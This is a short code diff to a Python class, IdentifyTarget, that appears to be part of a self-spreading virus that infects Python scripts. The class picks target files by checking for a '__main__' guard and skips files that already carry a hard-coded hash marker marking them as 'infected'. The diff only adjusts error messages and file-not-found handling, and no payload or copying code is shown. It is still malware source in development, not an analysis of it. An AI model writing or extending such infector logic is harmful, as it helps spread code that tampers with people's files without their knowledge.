@@ -19,9 +19,11 @@ class IdentifyTarget:
             required_statement = 'if __name__ == "__main__":'
             if required_statement in FileOperations.read(self.file): 
                 return True
-            print(f"Could not verify file {self.file} is python script; no {required_statement} statement.")
+            print(f"Could not verify file {self.file} is python script; no {required_statement} statement.\n")
             return False
-        except FileNotFoundError: raise FileNotFoundError(f"File {self.file} not found.")
+        except FileNotFoundError: 
+            print(f"File {self.file} not found.\n")
+            return False
     
     def is_infected(self):
         id = "# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d"
@@ -30,13 +32,13 @@ class IdentifyTarget:
                 print(f"File {self.file} is already infected.")
                 return True    
             return False
-        except FileNotFoundError: raise FileNotFoundError(f"File {self.file} not found.")
+        except FileNotFoundError: raise FileNotFoundError(f"File {self.file} not found.\n")
     
     def is_verified(self):
         ''' Runs is_script and is_infected, only returns 1 if is_script and not is_infected. '''
         if self.is_script() and not self.is_infected():  
             return 1
-        print(f"Verification of {self.file} failed.\nQuitting...") 
+        print(f"Verification of {self.file} failed.\nQuitting...\n") 
         return 0
 
 
